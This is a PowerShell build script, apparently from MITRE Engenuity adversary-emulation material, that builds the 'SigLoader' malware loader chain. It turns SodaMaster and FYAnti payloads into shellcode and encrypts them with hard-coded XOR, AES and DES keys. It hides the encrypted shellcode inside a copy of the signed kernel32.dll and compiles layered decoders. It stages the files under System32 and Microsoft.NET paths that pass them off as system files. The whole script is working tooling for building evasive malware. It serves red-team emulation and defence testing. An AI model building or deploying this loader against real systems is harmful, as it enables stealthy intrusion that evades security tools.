# ---------------------------------------------------------------------------
# build_sigloader.ps1 - Build SigLoader (all components)

# Copyright 2024 MITRE Engenuity. Approved for public release. Document number CT0005.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: .\build_sigloader.ps1

# Revision History:

# --------------------------------------------------------------------------- 

param(
	[switch] $i
)

$interactive = $i.ToBool() 



# Set default Values

# Debug mode 
$debug = 1

# Encryption information
$rc4_key = "abcdabcdabcdabcd"
$rc4_key_len = 16
$use_rc4 = "false"
$aes_key = "1234567890ABCDEF1234567890ABCDEF"
$aes_iv = "1234567890ABCDEF"
$des_key = "1234567890ABCDEF"
$des_iv = "12345678"
$xor_key = 0xA9
$signature = "tempsig1"
$data_size = 0
$encryption_order = '{XOR,AES,DES}'
$configType = "Release"

# File locations
$payloads = "$PSScriptRoot\payload"
$bin = "$PSScriptRoot\bin\$configType"

# File Names
$sodamasterDll = "sodamasterlib.dll"
$sodamasterExportedFunction = "init"
$sodamasterShell = "sodmaster"
$sodamasterLayer = "sodamaster_final"

$layer2Dll = "layer2.dll"
$layer2Shell = "layer2"
$layer2ExportedFunction = "LoadData"
$layer2Layer = "layer2_final"

$fyAntiShell = "fyanti"
$fyAntiLayer = "fyanti_final"

$layer1Dll = "layer1.dll"
$layer1Shell = "layer1"

$windowsDll = "kernel32.dll"

# File paths for payloads
$layer2PathSodamaster = "C:\\Windows\\System32\\hkp.dll" 
$sodamasterPath = "C:\\Windows\\System32\\win64_tools.dll" 

$layer2PathFYAntiVersion1 = "C:\\Windows\\System32\\skt.dll"
$layer2PathFYAntiVersion2 = "C:\\Windows\\System32\\nhi.dll"
$fyantiPathVersion1 = "C:\\Windows\\Microsoft.NET\\mshtml.wpf.wfx"
$fyantiPathVersion2 = "C:\\Windows\\Microsoft.NET\\mshtmled.wpf.cfg"

$filepath_1 = ""
$filepath_2 = ""


function write($data) {
	Write-Host $data
}

# Perform error checking on build commands
function errCheck {
	$err = Get-Content .\err.txt
	Remove-Item .\err.txt
	if ($err -ne $null) {
		write "Error running command: `n`n$err"
		write "`nExiting the build script"
		exit
	}

}

function checkFilePath($filepath) {
	write "Checking for: $filepath"
	if (!(Test-Path $filepath)) {
		write "Error: File not found."
		exit
	}
}

function cMakeClean {
	cmake --build build --config $configType --target clean
}


function runCMake($target) {
	
	
	$output = cmake -DCMAKE_BUILD_TYPE:STRING="$configType" -DDEBUG="$debug" -DENCRYPTION_ORDER="$encryption_order" -DSIGNATURE:STRING="$signature" -DRC4_KEY:STRING="$rc4_key" -DRC4_KEY_LEN="$rc4_key_len" -DRC4_USE="$use_rc4" -DAES_KEY:STRING="$aes_key" -DAES_IV:STRING="$aes_iv" -DDES_KEY:STRING="$des_key" -DDES_IV:STRING="$des_iv" -DXOR_KEY="$xor_key" -DDATA_SIZE="$data_size" -DFILEPATH_1:STRING="$filepath_1" -DFILEPATH_2:STRING="$filepath_2" -S . -B build 
	$output
	$output = cmake --build build --config Release --target $target -j 4 -- 
	$output
	
}


function getDataSize($sigflip_data) {
	ForEach ($line in $sigflip_data) {
		$line_data = $line -split ":"
		if ($line_data[1] -eq "Encrypted Data Size") {
			$data_size = $line_data[2].replace(' ','')
			return $data_size
		}
	}


	#Read-Host "Enter the encrypted data size"
}


function buildSodamaster {
	# Check if sodamaster dll exists
	checkFilePath "$payloads\$sodamasterDll"
	$filepath_2 = $sodamasterPath
	$use_rc4 = "true"
	

	if (!($interactive)) {
		write "Building sigflip for sodamaster..."
		runCMake "sigflip"
		write "Done"

		# Convert to shellcode
		write "Converting SodaMaster to shellcode"
		$output = ."$PSScriptRoot\util\build_shellcode.ps1" $payloads\$sodamasterDll $sodamasterExportedFunction "sodamaster_output\$sodamasterShell" 2>err.txt
		errCheck
		write "Done"

		write "Appending shellcode to dll"
		$command = "$bin\sigflip.exe -i C:\Windows\System32\$windowsDll $payloads\sodamaster_output\$sodamasterShell $payloads\sodamaster_output\$sodamasterLayer.dll" 
		$output = Invoke-Expression $command 2>err.txt
		errCheck
		write "Done"


		# We need to compile layer 2 with the same settings so that it can decode the sodamaster shellcode
		write "Compiling layer 2 with same settings as SodaMaster shellcode"
		$data_size = getDataSize $output
		runCMake "layer2"
		write "Finished compiling layer2"
	}
	write "Sodamaster shellcode dll is appended to: $payloads\sodamaster_output\$sodamasterLayer.dll"
}

function buildFYAnti($version) { # FYAnti is provided in sRDI already, so no need to convert it to shellcode
	# Building FYAnti
	checkFilePath "$payloads\$fyAntiShell"

	# Set the path for where FYAnti will be
	switch ($version)
	{
		"version1"
		{
			$filepath_2 = $fyantiPathVersion1
		}
		"version2"
		{
			$filepath_2 = $fyantiPathVersion2
		}
	}
	

	if (!($interactive)) {
		write "Building sigflip for fyanti..."
		runCMake "sigflip"
		write "Done"

		write "Appending shellcode to dll"
		$command = "$bin\sigflip.exe -i C:\Windows\System32\$windowsDll $payloads\$fyAntiShell $payloads\fyanti_output\$version\$fyAntiLayer.dll" 
		$output = Invoke-Expression $command 2>err.txt
		errCheck
		write "Done"


		# We need to compile layer 2 with the same settings so that it can decode the sodamaster shellcode
		write "Compiling layer 2 with same settings as FYAnti shellcode"
		$data_size = getDataSize $output
		runCMake "layer2"
		write "Finished compiling layer2"
	}
}

function buildLayer2($payload_type) {
	write "`n`n`n"
	# Compile layer 2
	write "Building layer 2..."

	checkFilePath "$bin\$layer2Dll"
	$subDirectory = ""

	# Set the filepath for where layer2 is
	switch ($payload_type)
	{
		"sodamaster"
		{
			$filepath_1 = $layer2PathSodamaster
			$subDirectory = "sodamaster_output"; Break
		}
		"fyanti_version1"
		{
			$filepath_1 = $layer2PathFYAntiVersion1
			$subDirectory = "fyanti_output\version1"; Break
		}
		"fyanti_version2"
		{
			$filepath_1 = $layer2PathFYAntiVersion2
			$subDirectory = "fyanti_output\version2"; Break
		}
	}

	if (!$interactive) {
		write "Converting layer2 to shellcode"
		write $subDirectory
		$output = ."$PSScriptRoot\util\build_shellcode.ps1" $bin\$layer2Dll $layer2ExportedFunction $layer2Shell 2>err.txt
		errCheck
		write "Done"

		write "Building sigflip for layer2..."
		runCMake "sigflip"
		write "Done"

		write "Appending shellcode to dll"
		$command = "$bin\sigflip.exe -i C:\Windows\System32\$windowsDll $payloads\$layer2Shell $payloads\$layer2Layer.dll" 
		$output = Invoke-Expression $command 2>err.txt
		errCheck
		write "Done"

		write $output

		# We need to compile layer 1 with the same settings so that it can decode the layer2 shellcode
		write "Compiling layer 1 with same settings as Layer 2 shellcode"
		$data_size = getDataSize $output

		write $filepath_1
		runCMake "layer1"
		write "Finished compiling layer1"

		# Move all the files to their subdirectory
		mv -Force "$payloads\$layer2Shell" "$payloads\$subDirectory\$layer2Shell"
		mv -Force "$payloads\$layer2Layer.dll" "$payloads\$subDirectory\$layer2Layer.dll"
		mv -Force "$bin\layer1.dll" "$payloads\$subDirectory\layer1.dll"
	}
	write "`n`n`n"
}



# Build for sodamaster
if (Test-Path "$payloads\$sodamasterDll") {
	write "SodaMaster DLL found, building..."
	cMakeClean
	buildSodamaster
	buildLayer2 "sodamaster"
}
else {
	write "SodaMaster DLL not found, skipping build."
}

# Build for FYAnti
if (Test-Path "$payloads\$fyAntiShell") {
	write "FYAnti shellcode found, building..."
	for ($var = 1; $var -le 2; $var++) 
	{
		cMakeClean
		buildFYAnti ("version" + $var.ToString())
		buildLayer2 ("fyanti_version" + $var.ToString())
	}
}
else {
	write "FYAnti Shellcode not found, skipping build."
}